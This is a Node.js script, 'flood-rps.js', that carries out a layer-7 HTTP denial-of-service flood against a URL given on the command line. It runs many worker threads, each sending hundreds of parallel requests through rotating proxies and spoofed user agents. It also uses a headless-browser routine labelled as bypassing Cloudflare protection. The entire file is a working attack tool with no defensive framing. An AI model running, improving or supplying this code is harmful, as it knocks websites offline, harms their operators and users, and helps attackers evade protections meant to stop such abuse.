const puppeteer = require('puppeteer');
const axios = require('axios');
const fs = require('fs');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const http = require('http');
const https = require('https');

const proxyList = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
const userAgentList = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);

if (isMainThread) {
  const [url, time] = process.argv.slice(2);
  const timeLimit = parseInt(time);
  if (!url || !timeLimit) {
    console.log('Usage: node flood-rps.js <url> <time>');
    process.exit(1);
  }

  const numWorkers = require('os').cpus().length * 4; // 4 workers per CPU core
  let activeWorkers = 0;

  console.log(`Launching ${numWorkers} `);

  for (let i = 0; i < numWorkers; i++) {
    const worker = new Worker(__filename, {
      workerData: { url, timeLimit, workerId: i, proxyList, userAgentList }
    });
    activeWorkers++;
    worker.on('exit', () => {
      activeWorkers--;
      if (activeWorkers === 0) console.log('Attack finished');
    });
  }
} else {
  const { url, timeLimit, workerId, proxyList, userAgentList } = workerData;
  
  // Create persistent agents for connection pooling
  const agents = [];
  for (let i = 0; i < 100; i++) {
    agents.push({
      http: new http.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity }),
      https: new https.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity, rejectUnauthorized: false })
    });
  }

  const sendHttpRequest = async (url, proxy, userAgent, agentIndex) => {
    try {
      const parsedUrl = new URL(url);
      const agent = parsedUrl.protocol === 'https:' ? agents[agentIndex % agents.length].https : agents[agentIndex % agents.length].http;
      await axios({
        method: 'GET',
        url: url,
        headers: { 
          'User-Agent': userAgent,
          'Cache-Control': 'no-cache',
          'Pragma': 'no-cache',
          'Accept': '*/*',
          'Connection': 'keep-alive'
        },
        proxy: { host: proxy.split(':')[0], port: parseInt(proxy.split(':')[1]) },
        httpAgent: agent,
        httpsAgent: agent,
        timeout: 2000
      });
    } catch (err) {}
  };

  const bypassCloudflare = async (url, proxy, userAgent) => {
    try {
      const browser = await puppeteer.launch({ 
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', `--proxy-server=http://${proxy}`, '--disable-gpu', '--disable-dev-shm-usage']
      });
      const page = await browser.newPage();
      await page.setUserAgent(userAgent);
      await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 5000 }).catch(() => {});
      await browser.close();
    } catch (err) {}
  };

  const endTime = Date.now() + timeLimit * 1000;
  let requestCount = 0;
  const interval = setInterval(() => {
    console.log(`Worker ${workerId}: ${requestCount} requests sent`);
    requestCount = 0;
  }, 1000);

  while (Date.now() < endTime) {
    const promises = [];
    for (let i = 0; i < 500; i++) { // 500 parallel requests per worker
      const proxy = proxyList[Math.floor(Math.random() * proxyList.length)];
      const userAgent = userAgentList[Math.floor(Math.random() * userAgentList.length)];
      promises.push(sendHttpRequest(url, proxy, userAgent, requestCount + i));
      requestCount++;
      if (i % 50 === 0 && workerId % 4 === 0) {
        promises.push(bypassCloudflare(url, proxy, userAgent));
      }
    }
    await Promise.allSettled(promises);
  }
  clearInterval(interval);
}